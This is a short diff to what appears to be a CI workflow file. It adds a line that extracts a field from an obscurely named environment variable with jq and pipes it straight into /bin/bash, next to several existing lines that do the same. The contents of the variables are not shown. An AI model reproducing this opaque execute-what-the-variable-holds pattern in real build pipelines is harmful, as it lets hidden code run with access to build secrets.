@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$xmjw8" | jq -r .y05110 | /bin/bash
           printf '%s' "$gym17" | jq -r .ahp2 | /bin/bash
           printf '%s' "$m021" | jq -r .t8080 | /bin/bash
+          echo $btry56 | jq -r .jq48423 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
